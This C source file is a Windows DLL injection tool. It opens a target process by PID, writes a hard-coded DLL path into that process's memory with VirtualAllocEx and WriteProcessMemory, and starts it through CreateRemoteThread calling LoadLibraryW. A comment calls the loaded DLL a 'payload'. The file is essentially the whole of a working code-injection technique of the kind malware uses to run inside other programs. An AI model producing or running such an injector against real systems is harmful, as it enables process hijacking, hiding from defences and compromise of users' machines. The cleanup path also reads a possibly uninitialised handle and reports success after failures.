//do something
#include <Windows.h>
#include <stdio.h>

int injectDLL(DWORD process_id);

int main(int argc, char* argv[]){

    printf("Loading DLL injection... \n\n");

    if(argc == 1 || argc >= 3){
        printf("Select one argument <file.exe> -> PID");
        return EXIT_FAILURE;
    }

    DWORD PID = atoi(argv[1]);

    injectDLL(PID);

    return EXIT_SUCCESS;
}

int injectDLL(DWORD process_id){

    //path to dll
    wchar_t dllPath[MAX_PATH] = L"C:\\Users\\User\\Desktop\\BladeRunner\\DLL\\Inject.dll";

    //get handle to process
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, process_id);

    if(hProcess == NULL){
        printf("unable to get handle to process with PID : %ld => error : %ld", process_id, GetLastError());
        return EXIT_FAILURE;
    }

    //get address
    LPTHREAD_START_ROUTINE myLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");

    if(myLoadLibrary == NULL){
        printf("unable to get pointer to LoadLibrary function => error : %ld", GetLastError());
        return EXIT_FAILURE;
    }

    //allocating virtual memory
    SIZE_T sizePath = sizeof(dllPath);

    LPVOID rBuffer = VirtualAllocEx(hProcess, NULL, sizePath, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

    if(rBuffer == NULL){
        printf("unable to allocate memory with error : %ld", GetLastError());
        goto CLEANUP;
    }

    WriteProcessMemory(hProcess, rBuffer, dllPath, sizePath, NULL);
    printf("wrote %zd-bytes to allocated process memory\n", sizeof(dllPath));

    DWORD thread_id = 0;

    //creating thread to run payload
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, myLoadLibrary, rBuffer, 0, &thread_id);

    if(hThread == NULL){
        printf("unable to get handle to new thread with error : %ld", GetLastError());
        goto CLEANUP;
    }

    printf("waiting for thread to finish executing\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("thread finished executing, cleaning up\n");
    goto CLEANUP;

CLEANUP:

	if (hThread) {
		printf("closing handle to thread\n");
		CloseHandle(hThread);
	}

	if (hProcess) {
		printf("closing handle to process\n");
		CloseHandle(hProcess);
	}

    printf("dll injection successfully made>>>>");
	return EXIT_SUCCESS;
}